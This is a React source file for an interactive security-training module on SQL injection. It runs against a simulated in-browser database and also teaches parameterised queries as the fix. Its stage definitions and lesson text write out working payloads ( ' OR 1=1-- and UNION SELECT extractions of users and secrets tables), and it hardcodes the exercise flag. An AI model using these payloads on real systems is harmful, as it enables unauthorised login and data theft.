"use client";

/* Module 5 — Injection (DEPTH STANDARD pilot).
 *
 * A full multi-stage engagement against the richer Northwind range, all on real
 * wasm SQLite (engine.ts · bootNorthwindRange), zero egress. The learner:
 *   Lesson    — reads + a hands-on "watch your input become code" lab.
 *   Capture   — 4 stages: PROBE (confirm the vuln via a real SQL error) ->
 *               BYPASS (' OR 1=1--) -> EXTRACT STAFF (UNION the users table) ->
 *               CRACK THE VAULT (UNION the secrets table for the flag).
 *   Defend    — reads + "pick the safe query" lab, then a check.
 * Each capture stage has a contextual payload palette, a hint ladder and a
 * last-resort reveal, so it's genuinely challenging but never a dead end. */

import { useEffect, useState } from "react";
import Engagement, { type ModuleDef, C, MONO, DISP, Btn } from "./Engagement";
import { bootNorthwindRange, type NorthwindRange, type RangeRunResult } from "./engine";

/* ───────────────────────── shared bits ───────────────────────── */

const inp: React.CSSProperties = { width: "100%", padding: "10px 12px", borderRadius: 8, background: C.carbon, color: C.ink, border: `1px solid ${C.line}`, fontFamily: MONO, fontSize: 13.5 };
const lab: React.CSSProperties = { display: "block", fontFamily: MONO, fontSize: 11, color: C.mute, margin: "0 0 5px", letterSpacing: ".08em" };
function dot(c: string): React.CSSProperties { return { width: 9, height: 9, borderRadius: "50%", background: c, display: "inline-block" }; }

function WinBar({ host }: { host: string }) {
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "11px 16px", borderBottom: `1px solid ${C.lineSoft}`, background: C.raise }}>
      <i style={dot(C.red)} /><i style={dot(C.amber)} /><i style={dot(C.green)} />
      <span style={{ fontFamily: MONO, fontSize: 11.5, color: C.soft, marginLeft: 6 }}>{host}</span>
    </div>
  );
}

function ResultView({ r }: { r: RangeRunResult }) {
  return (
    <div style={{ marginTop: 14, background: C.carbon, border: `1px solid ${r.error ? C.red : C.line}`, borderRadius: 10, padding: "12px 14px" }}>
      <div style={{ fontFamily: MONO, fontSize: 10, letterSpacing: ".12em", color: C.mute, marginBottom: 6 }}>QUERY THAT RAN</div>
      <pre style={{ margin: 0, fontFamily: MONO, fontSize: 11.5, color: "#8fa0c8", whiteSpace: "pre-wrap", lineHeight: 1.6 }}>{r.sql}</pre>
      {r.error ? (
        <div style={{ marginTop: 9, fontFamily: MONO, fontSize: 12.5, color: C.red }}>⚠ SQL error · {r.error}</div>
      ) : r.rows.length === 0 ? (
        <div style={{ marginTop: 9, fontFamily: MONO, fontSize: 12.5, color: C.mute }}>0 rows returned</div>
      ) : (
        <div style={{ marginTop: 10, overflowX: "auto" }}>
          <table style={{ borderCollapse: "collapse", fontFamily: MONO, fontSize: 12 }}>
            <thead>
              <tr>{r.columns.map((c, i) => <th key={i} style={{ textAlign: "left", padding: "4px 12px 6px 0", color: C.indigo2, borderBottom: `1px solid ${C.lineSoft}` }}>{c}</th>)}</tr>
            </thead>
            <tbody>
              {r.rows.map((row, i) => (
                <tr key={i}>{row.map((cell, j) => <td key={j} style={{ padding: "4px 12px 4px 0", color: String(cell).startsWith("flag{") ? C.green : C.soft, whiteSpace: "nowrap" }}>{String(cell)}</td>)}</tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

function Palette({ tokens, onInsert }: { tokens: string[]; onInsert: (t: string) => void }) {
  return (
    <div style={{ marginTop: 10 }}>
      <div style={{ fontFamily: MONO, fontSize: 10, letterSpacing: ".1em", color: C.mute, marginBottom: 7 }}>PAYLOAD PIECES · tap to add</div>
      <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
        {tokens.map((t) => (
          <button key={t} onClick={() => onInsert(t)} className="co-opt" style={{ padding: "5px 9px", borderRadius: 7, border: `1px solid ${C.line}`, background: C.panel, color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", whiteSpace: "pre" }}>{t.trim() || "␣"}</button>
        ))}
      </div>
    </div>
  );
}

function HintLadder({ hints, onReveal }: { hints: string[]; onReveal: () => void }) {
  const [shown, setShown] = useState(0);
  return (
    <div style={{ marginTop: 12 }}>
      {Array.from({ length: shown }).map((_, i) => (
        <div key={i} style={{ marginBottom: 6, padding: "9px 12px", borderLeft: `2px solid ${C.indigo}`, background: "rgba(139,123,255,0.05)", fontSize: 13, color: C.soft, lineHeight: 1.5 }}>{hints[i]}</div>
      ))}
      <div style={{ display: "flex", gap: 14, alignItems: "center", flexWrap: "wrap" }}>
        {shown < hints.length && <button onClick={() => setShown(shown + 1)} style={{ background: "none", border: "none", color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>{shown === 0 ? "hint" : "another hint"}</button>}
        {shown >= hints.length && <button onClick={onReveal} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>stuck? reveal the payload</button>}
      </div>
    </div>
  );
}

/* ───────────────────────── lesson lab ───────────────────────── */

function InputBecomesCodeLab({ onDone }: { onDone: () => void }) {
  const [val, setVal] = useState("");
  const broke = val.includes("'");
  useEffect(() => { if (broke) onDone(); }, [broke, onDone]);
  const before = `SELECT * FROM users WHERE email = '`;
  return (
    <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 12, padding: "15px 16px" }}>
      <div style={{ fontFamily: MONO, fontSize: 10.5, letterSpacing: ".1em", color: C.indigo, fontWeight: 700, marginBottom: 9 }}>▶ TRY IT · watch your input land inside the query</div>
      <label style={lab}>type an email… then try typing a single quote &apos;</label>
      <input style={inp} value={val} onChange={(e) => setVal(e.target.value)} placeholder="you@example.com" />
      <pre style={{ marginTop: 12, marginBottom: 0, fontFamily: MONO, fontSize: 12.5, whiteSpace: "pre-wrap", lineHeight: 1.7, color: "#8fa0c8" }}>
        {before}
        <span style={{ color: broke ? C.red : C.amber, background: broke ? "rgba(242,109,114,.12)" : "rgba(232,163,61,.12)", borderRadius: 3, padding: "0 2px" }}>{val || " "}</span>
        {`' AND pass = '…'`}
      </pre>
      {broke && (
        <div style={{ marginTop: 11, padding: "10px 13px", borderRadius: 9, background: "rgba(242,109,114,.08)", border: `1px solid ${C.red}55`, fontSize: 13, color: C.ink, lineHeight: 1.5 }}>
          See it? Your <b style={{ fontFamily: MONO }}>&apos;</b> closed the string early. Everything you type after it is now read as <b>SQL commands, not data</b>. That&rsquo;s the whole of injection — and you just did it.
        </div>
      )}
    </div>
  );
}

/* ───────────────────────── defend lab ───────────────────────── */

function PickSafeQueryLab({ onDone }: { onDone: () => void }) {
  const [picked, setPicked] = useState<number | null>(null);
  const opts = [
    { code: `"… WHERE email = '" + email + "'"`, ok: false, why: "This is the bug itself — gluing input into the string. Exactly what you just exploited." },
    { code: `"… WHERE email = '" + email.replace("'", "") + "'"`, ok: false, why: "Stripping quotes is a blocklist — bypassable (encodings, other characters) and it still builds the query by hand. Not the real fix." },
    { code: `"… WHERE email = ?"  +  bind([email])`, ok: true, why: "Parameterised: the ? is a placeholder and the value is sent separately, so the database treats it as data — never as SQL. This is the fix." },
  ];
  return (
    <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 12, padding: "15px 16px" }}>
      <div style={{ fontFamily: MONO, fontSize: 10.5, letterSpacing: ".1em", color: C.indigo, fontWeight: 700, marginBottom: 10 }}>▶ APPLY THE FIX · which login query is safe?</div>
      <div style={{ display: "grid", gap: 8 }}>
        {opts.map((o, i) => {
          const isP = picked === i;
          return (
            <div key={i}>
              <button onClick={() => { setPicked(i); if (o.ok) onDone(); }} className="co-opt" style={{ width: "100%", textAlign: "left", padding: "10px 12px", borderRadius: 9, border: `1px solid ${isP ? (o.ok ? C.green : C.red) : C.line}`, background: isP ? (o.ok ? "rgba(85,217,140,.08)" : "rgba(242,109,114,.06)") : C.carbon, color: C.ink, fontFamily: MONO, fontSize: 12.5, cursor: "pointer" }}>
                <span style={{ color: isP ? (o.ok ? C.green : C.red) : C.mute, marginRight: 8 }}>{isP ? (o.ok ? "✓" : "✗") : String.fromCharCode(65 + i)}</span>{o.code}
              </button>
              {isP && <div style={{ padding: "7px 12px 2px", fontSize: 12.5, color: o.ok ? "#bff3d3" : C.soft, lineHeight: 1.5 }}>{o.why}</div>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ───────────────────────── the 4-stage capture ───────────────────────── */

type Stage = {
  key: string; title: string; surface: "login" | "search"; goal: string;
  tokens: string[]; hints: string[]; reveal: string;
  done: (r: RangeRunResult & { authed?: boolean; asAdmin?: boolean }, range: NorthwindRange) => boolean;
};

const STAGES: Stage[] = [
  {
    key: "probe", title: "Probe", surface: "login", goal: "Confirm the login is injectable. Make it error by breaking the query — put a single quote in the email and log in.",
    tokens: ["'"], hints: ["A valid query won't error. Feed it something that breaks the SQL syntax.", "Put a single quote ' in the email field and submit. If the app trusts your input, the extra quote makes the query invalid and it throws."],
    reveal: "'",
    done: (r) => r.error != null,
  },
  {
    key: "bypass", title: "Bypass", surface: "login", goal: "Log in without a password. Close the string, add an always-true condition, and comment out the password check.",
    tokens: ["'", " OR 1=1", "--", " "], hints: ["Start by closing the string with a quote, like the probe.", "After the quote, add a condition that's always true: OR 1=1", "Finish with --  (and a trailing space) to comment out the rest of the line, including the password check. Put it in the EMAIL field; leave the password blank."],
    reveal: "' OR 1=1-- ",
    done: (r) => !!r.authed,
  },
  {
    key: "staff", title: "Extract staff", surface: "search", goal: "The product search is injectable too. Use a UNION to pull the whole staff table (email, pass, role) out through it.",
    tokens: ["'", " UNION SELECT ", "email", "pass", "role", ",", " FROM users", "--", " ", " ORDER BY 3", " ORDER BY 4"],
    hints: ["UNION bolts a second SELECT onto the first. Your UNION must return the SAME number of columns as the search — try ' ORDER BY 4--  then ' ORDER BY 3--  to find how many.", "The search returns 3 columns. So: ' UNION SELECT  (three things)  FROM users-- ", "Pull the useful three: ' UNION SELECT email, pass, role FROM users-- "],
    reveal: "' UNION SELECT email, pass, role FROM users-- ",
    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@northwind.range"))),
  },
  {
    key: "vault", title: "Crack the vault", surface: "search", goal: "There's a secrets table holding a master key. UNION it out the same way to capture the flag.",
    tokens: ["'", " UNION SELECT ", "label", "value", "NULL", ",", " FROM secrets", "--", " "],
    hints: ["Same UNION trick, different table: secrets. Still three columns.", "The secrets table has label and value. Pad the third column with NULL: ' UNION SELECT label, value, NULL FROM secrets-- "],
    reveal: "' UNION SELECT label, value, NULL FROM secrets-- ",
    done: (r, range) => r.rows.some((row) => row.some((c) => c === range.vaultFlag)),
  },
];

function InjectionAct({ onCapture }: { onCapture: () => void }) {
  const [range, setRange] = useState<NorthwindRange | null>(null);
  const [bootErr, setBootErr] = useState("");
  const [si, setSi] = useState(0);
  const [email, setEmail] = useState("");
  const [pass, setPass] = useState("");
  const [term, setTerm] = useState("");
  const [res, setRes] = useState<(RangeRunResult & { authed?: boolean; asAdmin?: boolean }) | null>(null);
  const [cleared, setCleared] = useState<boolean[]>([false, false, false, false]);

  useEffect(() => {
    let live = true;
    bootNorthwindRange().then((r) => live && setRange(r)).catch((e) => live && setBootErr((e as Error).message));
    return () => { live = false; };
  }, []);

  if (bootErr) return <div style={{ fontFamily: MONO, fontSize: 13, color: C.red }}>Range failed to boot: {bootErr}</div>;
  if (!range) return <div style={{ fontFamily: MONO, fontSize: 13, color: C.mute }}>// booting range target… (real SQLite, in-browser)</div>;

  const stage = STAGES[si];
  const field = stage.surface === "login" ? email : term;
  const setField = stage.surface === "login" ? setEmail : setTerm;

  function run() {
    if (!range) return;
    const r = stage.surface === "login" ? range.attemptLogin(email, pass) : range.search(term);
    setRes(r);
    if (stage.done(r, range)) {
      const next = [...cleared]; next[si] = true; setCleared(next);
    }
  }

  function advance() {
    setRes(null);
    if (si + 1 < STAGES.length) setSi(si + 1);
    else onCapture();
  }

  const stageCleared = cleared[si];

  return (
    <div style={{ display: "grid", gap: 14 }}>
      {/* stage rail */}
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        {STAGES.map((s, i) => (
          <div key={s.key} style={{ display: "flex", alignItems: "center", gap: 7, padding: "5px 11px", borderRadius: 999, border: `1px solid ${i === si ? C.indigo : C.lineSoft}`, background: cleared[i] ? "rgba(85,217,140,.08)" : i === si ? "rgba(139,123,255,.07)" : "transparent" }}>
            <span style={{ fontFamily: MONO, fontSize: 10.5, color: cleared[i] ? C.green : i === si ? C.indigo2 : C.mute, fontWeight: 700 }}>{cleared[i] ? "✓" : i + 1}</span>
            <span style={{ fontFamily: MONO, fontSize: 11, color: i === si ? C.ink : C.mute }}>{s.title}</span>
          </div>
        ))}
      </div>

      <div style={{ fontSize: 14, color: C.soft, lineHeight: 1.55, padding: "11px 14px", borderRadius: 10, background: "rgba(139,123,255,0.05)", border: `1px solid ${C.line}` }}>
        <b style={{ color: C.indigo2, fontFamily: DISP }}>Stage {si + 1} · {stage.title}. </b>{stage.goal}
      </div>

      {/* surface */}
      <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, overflow: "hidden" }}>
        <WinBar host={stage.surface === "login" ? "portal.northwind.range · staff login" : "shop.northwind.range · product search"} />
        <div style={{ padding: 18 }}>
          {stage.surface === "login" ? (
            <>
              <div style={{ marginBottom: 12 }}><label style={lab}>email</label><input style={inp} value={email} onChange={(e) => setEmail(e.target.value)} placeholder="name@northwind.range" /></div>
              <div style={{ marginBottom: 14 }}><label style={lab}>password</label><input style={inp} value={pass} onChange={(e) => setPass(e.target.value)} placeholder="(leave blank — go around it)" /></div>
            </>
          ) : (
            <div style={{ marginBottom: 14 }}><label style={lab}>search products</label><input style={inp} value={term} onChange={(e) => setTerm(e.target.value)} placeholder="e.g. oil" /></div>
          )}
          <Palette tokens={stage.tokens} onInsert={(t) => setField(field + t)} />
          <div style={{ display: "flex", gap: 12, alignItems: "center", flexWrap: "wrap", marginTop: 14 }}>
            <Btn tone="i" onClick={run}>{stage.surface === "login" ? "RUN LOGIN →" : "RUN SEARCH →"}</Btn>
            <button onClick={() => setField("")} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>clear</button>
          </div>
          {res && <ResultView r={res} />}
          {!stageCleared && <HintLadder key={stage.key} hints={stage.hints} onReveal={() => setField(stage.reveal)} />}
        </div>
      </div>

      {stageCleared && (
        <div className="co-anim co-pop" style={{ display: "flex", alignItems: "center", gap: 14, flexWrap: "wrap", padding: "13px 16px", borderRadius: 12, background: "rgba(85,217,140,.08)", border: `1px solid ${C.green}55` }}>
          <span style={{ fontFamily: MONO, fontSize: 12.5, color: C.green, fontWeight: 700 }}>✓ Stage {si + 1} cleared</span>
          <Btn tone="g" onClick={advance} style={{ marginLeft: "auto" }}>{si + 1 < STAGES.length ? "Next stage →" : "Capture the engagement →"}</Btn>
        </div>
      )}
    </div>
  );
}

/* ───────────────────────── module def ───────────────────────── */

export const MODULE5: ModuleDef = {
  code: "M-05",
  moduleNo: 5,
  title: "Injection",
  client: "Northwind Foods",
  brief:
    "A deep engagement. Northwind Foods' staff portal and product shop both build their database queries straight from whatever you type. Your job is the full job: prove the weakness, break in, pull out the staff records, and reach the one secret they really didn't want found. Four stages, all for real.",
  lesson: {
    blocks: [
      { h: "Injection: when data becomes code", body: "Injection happens when your input is mixed into a command the app runs. If the app doesn't keep your input strictly as data, you can add characters that end the data and start new commands — so your input runs as code. SQL injection aims this at the database, and it has been one of the most damaging web flaws for twenty years." },
      { h: "Breaking out of the string", body: "A login runs something like: …WHERE email = '<your input>'. Your text sits inside those quotes. Type a quote and you close the string early; add OR 1=1 and you've added an always-true condition; finish with -- to comment out the rest. The database returns rows it shouldn't, and the app lets you in." },
      { h: "Going further: UNION", body: "Breaking in is stage one. The deeper move is UNION SELECT, which bolts a second query onto the first and returns its results through the same page — so an injectable search box can be made to hand you other tables entirely: user accounts, password hashes, secrets. The only rule: your UNION must select the same number of columns as the original query." },
    ],
    example: {
      caption: "Below you'll do all of this for real. First, feel how your input lands inside the query.",
      lines: [
        { t: "login bypass:  ' OR 1=1--", leak: true },
        { t: "read a table:  ' UNION SELECT email, pass, role FROM users--", leak: true },
      ],
    },
    Interactive: InputBecomesCodeLab,
    check: {
      q: "What must be true for a UNION SELECT injection to work?",
      options: [
        { text: "You must already know the admin password.", feedback: "No — UNION reads data directly; it doesn't need a password." },
        { text: "Your UNION must select the same number of columns as the original query.", correct: true, feedback: "Right. Mismatched column counts error out — that's why you count columns first." },
        { text: "The database must be empty.", feedback: "The opposite — you're pulling real rows out of its tables." },
      ],
    },
  },
  scope: {
    target: "portal.northwind.range (login) + shop.northwind.range (search)",
    inScope: "both input fields; reading data via injection",
    offLimits: "DROP/DELETE/UPDATE, other Northwind hosts, real data",
    timebox: "this session",
  },
  handler: "Four stages. Confirm it's injectable, walk in the front door, then turn the search box into a window onto their whole database. Take your time — each stage has hints if you need them, but try it yourself first. That's how it sticks.",
  hint: "This is a multi-stage engagement — work the stages in order. Each one has its own hint ladder and, as a last resort, a reveal. The password field can stay empty throughout; you're going around it, not guessing it.",
  Act: InjectionAct,
  flag: "flag{un10n_t0_the_v4ult}",
  defend: {
    blocks: [
      { h: "The fix: parameterised queries", body: "Never build a query by gluing strings together. Use parameterised queries (prepared statements): write the query with placeholders, then hand the database the input separately. The database treats that input strictly as a value — never as part of the command — so ' OR 1=1-- becomes a (failed) login with a very strange email, and UNION payloads are just odd search terms." },
      { h: "Defence in depth", body: "Parameterisation is the cure; these are the seatbelts. Give the app's database account only the permissions it needs, so even a successful injection can't read tables it shouldn't or drop anything. Validate input where you sensibly can. And never return raw database errors to users — that error you triggered in stage one is exactly what tells an attacker the door is open." },
    ],
    Interactive: PickSafeQueryLab,
    check: {
      q: "Why does a parameterised query stop the UNION attack you just ran?",
      options: [
        { text: "It hides the error messages.", feedback: "Hiding errors removes a clue, but the injection would still work. Parameterisation stops it outright." },
        { text: "The input is sent as a value the database never executes, so it can't become SQL.", correct: true, feedback: "Right — placeholders keep input as data, so quotes and UNIONs are just literal characters." },
        { text: "It makes the query run faster.", feedback: "Prepared statements can be faster, but that's not why they're secure — they keep input as data." },
      ],
    },
  },
  finding: {
    title: "SQL injection: auth bypass and full database read",
    where: "portal.northwind.range /login + shop.northwind.range /search",
    severity: "Critical",
    cvss: "9.8",
    impact: "Both the login and the product search build SQL from raw input. An attacker can log in with no password, read every staff record (emails and passwords), and extract secrets from other tables via UNION — a complete compromise of the database.",
    fix: "Use parameterised queries everywhere; never concatenate input into SQL. Add least-privilege DB accounts and suppress raw error output as defence in depth.",
  },
  rep: 70,
  repRank: "Junior Operator",
  repTo: "205 / 300 to Operator",
  next: "NEXT MODULE · Cross-Site Scripting →",
};

export default function Module5() {
  return <Engagement mod={MODULE5} />;
}
